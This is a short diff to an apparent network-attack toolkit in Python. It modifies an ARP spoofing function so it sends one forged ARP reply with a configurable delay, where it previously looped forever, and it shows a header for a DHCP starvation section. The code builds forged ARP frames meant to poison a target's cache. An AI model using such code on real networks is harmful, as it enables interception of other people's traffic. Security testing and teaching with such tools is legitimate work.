@@ -10,7 +10,7 @@ import psutil
 import ipaddress
 
 # ARP Spoofing
-def arp_spoofing_target(host_tupl, target_tupl, randomise_mac=False):
+def arp_spoofing_target(host_tupl, target_tupl, randomise_mac=False, delay=0):
 
     # initial values
     host_ip = host_tupl[0]
@@ -35,11 +35,9 @@ def arp_spoofing_target(host_tupl, target_tupl, randomise_mac=False):
     arp = ARP(op=2, pdst=target_ip, psrc=host_ip, hwdst=target_mac)
     frame = eth_l2 / arp
 
-    while True:
-        sendp(frame, iface=state.current_interface_object['interface_name'])
-        time.sleep(.2)
-
-    return True, "Spoofing.."
+    sendp(frame, iface=state.current_interface_object['interface_name'])
+    time.sleep(delay)
+    return True, "Spoof packet sent!"
 
 # DHCP starvation
 
